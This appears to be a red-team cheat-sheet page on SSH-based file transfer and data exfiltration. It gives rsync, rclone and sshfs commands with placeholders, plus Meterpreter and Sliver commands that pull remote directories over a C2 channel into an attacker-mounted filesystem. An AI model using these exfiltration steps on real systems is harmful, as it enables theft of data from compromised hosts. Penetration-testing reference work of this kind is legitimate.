---
author(s):
  - Userware
tags:
  - post-exploitation
  - file-transfer-and-data-exfiltration
  - ssh
  - linux
---
# Client

## 01 - Download

### 1.1 - Rsync

> [!IMPORTANT] Conditions
> The SSH server must have [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x04 - File Transfer and Data Exfiltration/Linux/Network Ports/Rsync|`rsync`]] installed.

```
$ rsync -r[v]huzPe "ssh -o UserKnownHostsFile=/dev/null [-p <PORT>]" <username>@<IP>:<file_source> <file_destination>
```

## 02 - Upload

### 2.1 - Rsync

```
$ rsync -r[v]huPze "ssh -o UserKnownHostsFile=/dev/null [-p <PORT>]" <file_source> <username>@<IP>:<file_destination>
```

> [!CAUTION]
> `--remove-source-files` flag will remove the files from the source directory. Think of it as moving all the data to the destination then cleans up the source.

```
$ rsync --remove-source-files -r[v]huPze "ssh -o UserKnownHostsFile=/dev/null [-p <PORT>]" <file_source> <username>@<IP>:<file_destination>
```

### 2.2 - RClone

Specifying a port number is optional unless a SSH port number has changed

```
$ rclone config create SFTPserver sftp host <IP> user <username> [port <PORT>] pass <password> --config sftphost.conf
```

## 03 - SSHFS

Mount SSH server as a filesystem

```
$ sudo mkdir /mnt/ssh_filesystem && sudo chown $USER:$USER /mnt/ssh_filesystem/

$ sshfs <username>@<IP>:/path/to/remote/directory/ /mnt/ssh_filesystem/ -C [-p <PORT>]
```

To unmount the filesystem

```
$ fusermount -u /mnt/ssh_filesystem/
```

### 3.1 - Use Cases

#### 3.1.1 - Exfiltration over C2 channel

##### 3.1.1.1 - Metasploit

```
meterpreter > download -r [<drive_letter>:]/path/to/remote/directory/ /mnt/ssh_filesystem/
```

##### 3.1.1.2 - Sliver

```
sliver (IMPLANT NAME) > download -r [<drive_letter>:]/path/to/remote/directory/ /mnt/ssh_filesystem/
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x04 - File Transfer and Data Exfiltration/Cross Platform/RClone|RClone]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x04 - File Transfer and Data Exfiltration/Cross Platform/C2 Frameworks/Metasploit|Metasploit: Data Exfiltration]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x04 - File Transfer and Data Exfiltration/Cross Platform/C2 Frameworks/Sliver|Sliver: Data Exfiltration]]

### Source Repository

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)